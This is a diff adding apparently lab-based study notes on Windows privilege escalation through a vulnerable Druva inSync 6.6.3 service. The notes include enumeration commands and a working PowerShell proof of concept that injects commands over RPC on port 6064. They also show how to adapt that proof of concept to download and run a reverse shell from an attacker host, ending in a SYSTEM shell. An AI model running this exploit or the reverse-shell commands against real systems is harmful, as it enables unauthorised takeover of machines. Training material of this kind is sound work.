@@ -2680,4 +2680,142 @@ htb-student:1002:...
 
 ---
 
+# 🔎 Vulnerable Services 
+
+## 📌 Context
+- Even well‑patched systems can be exploitable if:
+  - Users install vulnerable third‑party applications.
+  - Services run with **SYSTEM** privileges.
+- Risks include:
+  - Privilege escalation
+  - Denial of service
+  - Access to sensitive data (e.g., config files with passwords)
+
+
+## 🛠️ Enumerating Installed Programs
+```cmd
+C:\htb> wmic product get name
+```
+
+**Output:**
+```
+Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
+Update for Windows 10 for x64-based Systems (KB4023057)
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
+VMware Tools
+Druva inSync 6.6.3
+Microsoft Update Health Tools
+Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
+Update for Windows 10 for x64-based Systems (KB4480730)
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
+```
+
+- **Finding:** Druva inSync v6.6.3 vulnerable to **command injection** via RPC service.
+- Runs as **NT AUTHORITY\SYSTEM**.
+- Service listens on **port 6064**.
+
+## 🌐 Enumerating Local Ports
+```cmd
+C:\htb> netstat -ano | findstr 6064
+```
+
+**Output:**
+```
+TCP    127.0.0.1:6064   0.0.0.0:0   LISTENING   3324
+TCP    127.0.0.1:6064   127.0.0.1:50274   ESTABLISHED   3324
+TCP    127.0.0.1:6064   127.0.0.1:50510   TIME_WAIT   0
+TCP    127.0.0.1:6064   127.0.0.1:50511   TIME_WAIT   0
+TCP    127.0.0.1:50274  127.0.0.1:6064   ESTABLISHED   3860
+```
+
+## 🧩 Mapping PID to Process
+```powershell
+PS C:\htb> get-process -Id 3324
+```
+
+**Output:**
+```
+Id   SI ProcessName
+3324 0  inSyncCPHwnet64
+```
+
+
+## 📋 Enumerating Running Service
+```powershell
+PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
+```
+
+**Output:**
+```
+Status   Name               DisplayName
+Running  inSyncCPHService   Druva inSync Client Service
+```
+
+## ⚡ Exploit PoC (PowerShell)
+```powershell
+$ErrorActionPreference = "Stop"
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length)
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+## 🛠️ Modifying PoC for Reverse Shell
+
+### Append reverse shell to `shell.ps1`
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
+```
+
+### Modify `$cmd` in PoC
+```powershell
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
+```
+
+---
+
+## 🌍 Hosting Payload
+```bash
+$ python3 -m http.server 8080
+```
+
+
+## 🎯 Catching SYSTEM Shell
+
+### Netcat listener
+```bash
+$ nc -lvnp 9443
+```
+
+**Output:**
+```
+listening on [any] 9443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
+Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
+```
+
+### Verify privileges
+```powershell
+PS C:\WINDOWS\system32> whoami
+nt authority\system
+
+PS C:\WINDOWS\system32> hostname
+WINLPE-WS01
+```
+
+---
 
